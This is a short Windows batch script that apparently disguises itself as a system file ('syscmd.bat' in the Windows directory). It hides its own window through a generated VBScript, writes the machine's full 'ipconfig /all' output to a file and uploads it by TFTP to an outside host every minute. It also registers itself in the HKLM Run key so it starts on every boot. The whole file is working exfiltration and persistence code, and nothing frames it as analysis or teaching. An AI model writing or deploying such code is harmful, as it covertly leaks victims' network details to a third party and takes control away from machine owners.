::This File must be named "syscmd.bat" and be put in windir to be called by the another process
::**********************************************************************************************
@echo off

if "%1" neq "1" (
>"%temp%\tmp.vbs" echo set WshShell = WScript.CreateObject^(^"WScript.Shell^"^) 
>>"%temp%\tmp.vbs" echo WshShell.Run chr^(34^) ^& %0 ^& chr^(34^) ^& ^" 1^",0 
start /d "%temp%" tmp.vbs 
exit 
) 

:begin
ipconfig/flushdns
ipconfig/all>aa.txt
tftp -i user01.gicp.net put aa.txt myip.txt

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v syscmd /t reg_sz /d "\"%windir%\syscmd.bat"\" /f
echo wscript.sleep 60000>sleep.vbs
cscript sleep.vbs >nul

goto begin
